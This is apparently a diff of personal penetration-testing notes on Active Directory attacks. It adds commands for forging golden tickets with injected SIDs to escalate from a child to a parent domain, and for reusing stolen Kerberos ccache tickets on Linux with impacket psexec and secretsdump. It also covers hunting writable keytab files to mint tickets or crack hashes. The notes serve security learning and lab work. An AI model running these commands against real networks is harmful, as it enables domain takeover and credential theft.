@@ -466,6 +466,7 @@ If a domain is compromised, we can add to `sidHistory` the SID of a group such a
 ```shell!
 mimikatz# kerberos::golden /user:dummy /domain:dev.example.com /sid:<child domain SID> /krbtgt:<hash> /sids:<target domain SID> /ptt
 PS> .\Rubeus.exe golden /rc4:<krbtgt hash> /domain:dev.example.com /sid:<child domain SID>  /sids:<target domain SID> /user:dummy /ptt
+$ impacket-ticketer -nthash <krbtgt hash> -domain dev.example.com -domain-sid <child domain SID> -extra-sid <target domain SID> dummy
 ```
 
 You can use PowerView or Active Directory Module on Windows:
@@ -481,11 +482,65 @@ On Linux, you can use impacket:
 ```shell!
 $ # concatenate DOMAIN_SID and GROUP_RID to get GROUP_SID
 $ impacket-lookupsid dev.example.com/username:'password'@IP
+$ # Get the SID for a specific group
+$ rpcclient -U "username" --password 'password' IP
+rpcclient> lookupnames "example\Enterprise Admins"
 ```
 
 📚 If a user is migrated to another forest and SID filtering is disabled, then they retain their rights on their original domain.
 
 ⚠️ The injected SID must not exist within the compromised domain.
+
+⚠️ The `impacket-raiseChild` is automating this, but do it manually <small>(impacket-raiseChild -target-exec DCIP dev.example.com/admin:admin)</small>.
+</div></div>
+
+<hr class="sep-both">
+
+## Active Directory On Linux
+
+[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+<div class="row row-cols-lg-2"><div>
+
+While uncommon, it's possible for Linux clients to be connected to Active Directory. We can use the `realm` command to dig information:
+
+```shell!
+$ realm list # see also: sssd, winbind
+  ...
+  permitted-logins: username@xxx.yyy
+  permitted-groups: XXX
+```
+
+[Kerberos tickets](#kerberos) are stored in `/tmp` as ccache files. The current ticket is set by setting the `KRB5CCNAME` environment variable.
+
+```shell!
+$ export KRB5CCNAME=FILE:/tmp/krb5cc_xxx_yyy
+$ export KRB5CCNAME=FILE:/var/lib/sss/db/ccache_XXX.YYY
+$ klist # information about the current ticket
+$ impacket-ticketConverter xxx yyy.kirbi # from ccache to kirbi
+```
+
+☠️ We can use someone else's ticket as long as we got `rw` on it.
+</div><div>
+
+You can use the ccache with many of impacket tools:
+
+```shell!
+$ # example.com, dev.example.com, and DC01.example.com must be in /etc/hosts
+$ impacket-psexec dev.example.com/hacker@DC01.example.com -k -no-pass -target-ip 172.16.5.5
+$ impacket-secretsdump dev.example.com/hacker@DC01.example.com -no-pass -k -just-dc-user EXAMPLE/username
+```
+
+Users and scripts can use a [keytab](https://kb.iu.edu/d/aumh) file to store Kerberos principals and encryption keys that can be used to create tickets without having to store the plaintext password. To use it, we need `rw` permissions on it.
+
+```shell!
+$ find / -name "*keytab*" -readable -writable -ls 2>/dev/null
+$ kinit xxx@yyy.zzz -k -t /path/to/xxx.keytab
+$ klist # new ticket associated with xxx@yyy.zzz
+```
+
+☠️ If you find a readable keytab file, you can create tickets. You can also use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) <small>(0.2k ⭐)</small> to dump the hash and crack it.
 </div></div>
 
 <hr class="sep-both">
